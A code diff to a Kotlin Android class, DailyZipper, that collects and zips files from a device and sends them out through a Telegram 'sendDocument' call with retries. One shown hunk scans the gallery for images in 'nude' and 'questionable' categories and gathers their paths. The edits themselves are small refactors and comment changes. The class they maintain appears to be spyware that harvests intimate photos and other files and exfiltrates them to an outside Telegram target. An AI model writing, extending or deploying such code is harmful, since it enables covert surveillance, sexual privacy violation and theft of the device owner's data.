@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * ✅ تم إزالة كافة استخدامات [] واستبدالها بـ put/getOrElse/entries لتجنب MatchGroupCollection.
+ * ✅ تم إزالة كافة استخدامات [] واستبدالها بـ put/getOrElse/entries لتجنب MatchGroupCollection نهائياً.
  */
 class DailyZipper(
     context: Context,
@@ -155,7 +155,9 @@ class DailyZipper(
         try {
             val jsonStr = configFile.readText(Charsets.UTF_8)
             val json = JSONObject(jsonStr)
-            json.keys().forEach { key ->
+            val keys = json.keys()
+            while (keys.hasNext()) {
+                val key = keys.next()
                 val value = json.opt(key)
                 if (value != null) {
                     config.put(key, value)
@@ -304,7 +306,7 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
+                // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection نهائياً
                 val isOk = if (result is Map<*, *>) {
                     val okEntry = result.entries.firstOrNull { it.key?.toString() == "ok" }
                     val okValue = okEntry?.value
@@ -645,7 +647,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection
+                            // ✅ استخدام entries بدلاً من [] لتجنب MatchGroupCollection نهائياً
                             if (item is Map<*, *>) {
                                 val pathEntry = item.entries.firstOrNull { it.key?.toString() == "path" }
                                 val path = pathEntry?.value?.toString()
